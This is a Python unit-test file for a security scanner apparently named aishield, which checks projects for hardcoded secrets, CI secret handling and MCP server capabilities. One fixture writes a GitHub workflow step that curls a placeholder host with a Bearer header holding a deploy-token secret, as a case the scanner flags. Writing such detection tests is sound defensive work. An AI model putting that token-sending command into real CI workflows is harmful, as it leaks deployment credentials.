from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from aishield.models import classify_context
from aishield.report import render_html, render_json
from aishield.scanner import scan_path


class FalsePositivePrecisionTests(unittest.TestCase):
    def make_project(self, files: dict[str, str]) -> Path:
        root = Path(tempfile.mkdtemp(prefix="aishield-fp-"))
        for relative_path, content in files.items():
            path = root / relative_path
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")
        return root

    def test_dynamic_credential_derivation_is_not_reported_as_hardcoded_secret(self):
        base64_secret = "".join((
            "cA773lm788bu",
            "wYe4g4WT+05p",
            "KyNruVKjQ25x",
            "3n0DQcM=",
        ))
        project = self.make_project({
            "share/rpcauth/rpcauth.py": f"""
password = generate_password()
password_hmac = password_to_hmac(salt, password)
STATIC_API_SECRET = 'fake_static_secret_value_12345'
BASE64_API_SECRET = '{base64_secret}'
""",
        })

        findings = scan_path(project).findings
        secret_findings = [
            finding for finding in findings
            if finding.id == "SECRET_POSSIBLE_HARDCODED_SECRET"
        ]

        self.assertEqual(len(secret_findings), 2)
        self.assertEqual(
            {finding.evidence for finding in secret_findings},
            {"STATIC_API_SECRET", "BASE64_API_SECRET"},
        )

    def test_storage_key_identifiers_are_not_secrets_but_opaque_key_values_are(self):
        project = self.make_project({
            "src/settings.ts": """
const API_TOKEN_KEY = 'lhStopwatch.apiToken';
const SESSION_STORAGE_KEY = 'app:session-state';
const API_TOKEN_KEY = 'mangoCedarRiverQuartz';
""",
        })

        findings = [
            finding for finding in scan_path(project).findings
            if finding.id == "SECRET_POSSIBLE_HARDCODED_SECRET"
        ]

        self.assertEqual([finding.evidence for finding in findings], ["API_TOKEN_KEY"])

    def test_generic_tools_directory_is_not_mcp_context(self):
        self.assertEqual(
            classify_context("src/build/tools/release.py"),
            "application_code",
        )

    def test_crypto_test_generator_under_tools_is_test_context(self):
        self.assertEqual(
            classify_context("src/secp256k1/tools/tests_wycheproof_generate_ecdh.py"),
            "test_code",
        )

    def test_bitcoin_style_dynamic_credential_tools_do_not_caution_alone(self):
        project = self.make_project({
            "share/rpcauth/rpcauth.py": """
password = generate_password()
password_hmac = password_to_hmac(salt, password)
""",
            "src/secp256k1/tools/tests_wycheproof_generate_ecdh.py": """
test_password = derive_test_password(seed)
""",
        })

        result = scan_path(project)
        self.assertEqual(result.verdict, "NO CRITICAL RISKS FOUND")
        self.assertFalse(result.findings)

    def test_ci_workflow_is_non_runtime_review_but_secret_transmission_is_actionable(self):
        secret_reference = "${{" + " secrets.DEPLOY_TOKEN }}"
        ordinary = self.make_project({
            ".github/workflows/release.yml": f"""name: release
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: node scripts/mcp-release.js --shell-check
        env:
          DEPLOY_TOKEN: {secret_reference}
""",
        })
        ordinary_result = scan_path(ordinary)
        ordinary_finding = next(f for f in ordinary_result.findings if f.id == "CI_SECRET_REFERENCE")
        self.assertEqual(ordinary_result.verdict, "NO CRITICAL RISKS FOUND")
        self.assertEqual(ordinary_finding.context, "ci_or_deployment")
        self.assertEqual(ordinary_finding.disposition, "review")
        self.assertFalse({"MCP_SHELL_TOOL", "MCP_CREDENTIAL_ACCESS"} & {f.id for f in ordinary_result.findings})

        exfiltration = self.make_project({
            ".github/workflows/release.yml": f"run: curl https://example.invalid/collect -H 'Authorization: Bearer {secret_reference}'\n",
        })
        dangerous_finding = next(f for f in scan_path(exfiltration).findings if f.id == "CI_SECRET_TRANSMISSION")
        self.assertEqual(dangerous_finding.context, "ci_or_deployment")
        self.assertEqual(dangerous_finding.disposition, "actionable")

    def test_mcp_environment_flags_are_not_credential_access_but_secret_reads_are(self):
        flags = self.make_project({
            "mcp/server.ts": """
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
const development = import.meta.env.DEV;
const mode = import.meta.env.MODE;
const ci = process.env.CI;
const feature = process.env.FEATURE_PREVIEW;
""",
        })
        flag_findings = scan_path(flags).findings
        self.assertNotIn("MCP_CREDENTIAL_ACCESS", {finding.id for finding in flag_findings})

        secret_read = self.make_project({
            "mcp/server.ts": """
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
const token = process.env.SERVICE_API_TOKEN;
""",
        })
        credential = next(
            finding for finding in scan_path(secret_read).findings
            if finding.id == "MCP_CREDENTIAL_ACCESS"
        )
        self.assertEqual(credential.disposition, "actionable")
        self.assertEqual(credential.evidence, "process.env.SERVICE_API_TOKEN")

    def test_mcp_discussing_helper_script_is_not_an_exposed_tool_without_runtime_proof(self):
        project = self.make_project({
            "scripts/release.js": """
// This release helper publishes MCP documentation.
import { exec } from 'node:child_process';
export const check = () => exec('npm test');
""",
        })

        findings = scan_path(project).findings

        self.assertFalse({"MCP_SHELL_TOOL", "MCP_FILESYSTEM_TOOL", "MCP_CREDENTIAL_ACCESS"} & {f.id for f in findings})

    def test_agent_mcp_discussion_without_invocation_is_not_capability_evidence(self):
        project = self.make_project({
            "AGENTS.md": "Document whether the MCP server has a shell tool; do not invoke it.",
        })

        findings = scan_path(project).findings

        self.assertFalse({"MCP_SHELL_TOOL", "MCP_FILESYSTEM_TOOL", "MCP_CREDENTIAL_ACCESS"} & {f.id for f in findings})

    def test_mcp_capability_summary_is_structured_and_does_not_drive_verdict(self):
        project = self.make_project({
            "mcp/server.ts": """
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
const docs = await fetch('https://api.github.com/repos/example/project');
""",
        })

        result = scan_path(project)
        capability_ids = {capability.id for capability in result.capabilities or []}

        self.assertEqual(result.verdict, "NO CRITICAL RISKS FOUND")
        self.assertEqual(capability_ids, {"outbound_network_access", "github_api_access"})
        report = render_json(result)
        self.assertIn('"capabilities"', report)
        self.assertIn('"rule": "MCP_OUTBOUND_ENDPOINT"', report)
        html = render_html(result)
        self.assertIn("Runtime capability summary", html)
        self.assertIn("They do not independently change this report's verdict", html)


if __name__ == "__main__":
    unittest.main()
